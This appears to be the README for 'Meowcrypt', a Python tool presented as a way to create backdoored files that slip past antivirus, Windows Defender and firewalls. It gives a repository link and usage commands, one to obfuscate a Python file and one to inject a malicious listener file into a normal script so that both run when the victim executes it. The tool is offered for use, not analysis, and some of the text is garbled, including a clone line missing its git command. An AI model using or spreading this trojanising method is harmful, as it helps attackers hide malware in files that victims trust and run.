Hi, i'm MeowtonKalava to LOLITEAM
website: https://dinhducthien.ooo/
 Distros tested on : Kali Rolling
## Description:
Meowcrypt used languages python for creat file backdoor.
and not check anti-virus, windows defender, firewall
# Download Tool:

```
$ https://github.com/MeoSully/MeowtonCrypt.git

# Usage:
# encrypt a python file

python Meowcrypt.py --file=filetoencrypt.py
python Meowcrypt.py --file=filetoencrypt.py --output=output_file.py

# inject a malicious python file into a normal python file

python Meowcrypt --file=normal_file.py --backdoor-file=msf_listener.py --output=test.py


/* when you will execute the file 'test.py' the file 'file.py' will be executed in the same time with
 the file 'listen.py' with multi-threading system */

"""
